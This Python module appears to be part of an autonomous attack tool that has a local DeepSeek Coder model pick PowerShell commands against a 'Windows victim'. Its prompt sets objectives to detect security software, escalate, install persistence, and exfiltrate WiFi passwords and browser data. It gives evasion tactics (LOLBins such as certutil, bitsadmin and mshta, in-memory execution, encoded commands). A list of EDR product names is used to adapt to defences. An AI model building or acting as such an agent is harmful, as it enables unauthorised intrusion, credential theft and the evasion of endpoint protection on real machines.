"""
AI Handler Module - DeepSeek Coder integration via Ollama
Contains: AgentState, ask_ai, ask_ai_streaming, build_ai_prompt
"""

import json
import requests
from rich.console import Console

console = Console()

# Ollama API endpoint
OLLAMA_URL = "http://localhost:11434/api/generate"
MODEL_NAME = "deepseek-coder:6.7b"


class AgentState:
    """Tracks what we know about the victim and our objectives."""
    
    def __init__(self):
        self.hostname = None
        self.username = None
        self.is_admin = False
        self.os_version = None
        self.defender_status = None
        self.edr_processes = []
        self.wifi_passwords = []
        self.persistence_installed = False
        self.command_history = []
        self.iteration = 0
        
    def to_dict(self):
        return {
            "hostname": self.hostname,
            "username": self.username,
            "is_admin": self.is_admin,
            "os_version": self.os_version,
            "defender_status": self.defender_status,
            "edr_running": self.edr_processes,
            "wifi_count": len(self.wifi_passwords),
            "persistence": self.persistence_installed,
            "iteration": self.iteration
        }


def ask_ai(prompt, max_tokens=500):
    """Query DeepSeek Coder via Ollama (blocking)."""
    try:
        response = requests.post(
            OLLAMA_URL,
            json={
                "model": MODEL_NAME,
                "prompt": prompt,
                "stream": False,
                "options": {"num_predict": max_tokens, "temperature": 0.3}
            },
            timeout=180
        )
        return response.json().get("response", "").strip()
    except Exception as e:
        return f"[AI ERROR: {e}]"


def ask_ai_streaming(prompt, max_tokens=500):
    """Query DeepSeek Coder with LIVE streaming output."""
    full_response = ""
    try:
        response = requests.post(
            OLLAMA_URL,
            json={
                "model": MODEL_NAME,
                "prompt": prompt,
                "stream": True,
                "options": {"num_predict": max_tokens, "temperature": 0.3}
            },
            stream=True,
            timeout=300
        )
        console.print("[bold magenta]AI Thinking (live):[/]")
        for line in response.iter_lines():
            if line:
                try:
                    data = json.loads(line)
                    token = data.get("response", "")
                    full_response += token
                    print(token, end="", flush=True)
                    if data.get("done"):
                        break
                except Exception:
                    pass
        print()
        return full_response.strip()
    except Exception as e:
        return f"[AI ERROR: {e}]"


def build_ai_prompt(state, last_output=""):
    """Build the prompt for the AI to decide next action."""
    
    # Build EDR-aware guidance
    edr_guidance = ""
    if state.edr_processes:
        edr_guidance = f"""
EDR/SECURITY SOFTWARE DETECTED: {', '.join(state.edr_processes)}
STEALTH MODE REQUIRED:
- Use ONLY LOLBins (certutil, bitsadmin, mshta, wmic)
- Use ONLY in-memory techniques
- Avoid file writes to disk
- Use encoded commands when possible
"""
    else:
        edr_guidance = """
NO EDR DETECTED - can use more aggressive techniques:
- Direct file writes allowed
- PowerShell scripts OK
- Registry modifications OK
"""
    
    return f"""You are an autonomous pentesting AI with shell access to a Windows victim.

CURRENT STATE:
{json.dumps(state.to_dict(), indent=2)}

LAST COMMAND OUTPUT:
{last_output[:1000] if last_output else "(none yet)"}
{edr_guidance}
OBJECTIVES (complete in order):
1. DETECT EDR - Check for security software
2. RECON - Get hostname, username, check if admin (whoami /priv)
3. PERSIST - Install persistence (adapt based on EDR presence)
4. EXFIL - Extract WiFi passwords, browser data

RULES:
- Respond with ONLY ONE PowerShell command
- No explanations, just the command
- Use short, efficient commands  
- If EDR detected, use stealthier techniques
- If objective done, move to next

COMMAND:"""


# EDR process names for detection
EDR_NAMES = [
    'defender', 'msmpeng', 'crowdstrike', 'csfalcon', 'carbonblack',
    'sentinel', 'cylance', 'sophos', 'mcafee', 'symantec', 'eset',
    'kaspersky', 'avast', 'avg', 'bitdefender', 'malwarebytes'
]


def detect_edr_from_output(result, state):
    """Parse command output to detect EDR processes."""
    if result:
        result_lower = result.lower()
        for edr in EDR_NAMES:
            if edr in result_lower and edr not in [e.lower() for e in state.edr_processes]:
                state.edr_processes.append(edr.capitalize())
                console.print(f"[red]EDR Detected: {edr.capitalize()}[/]")
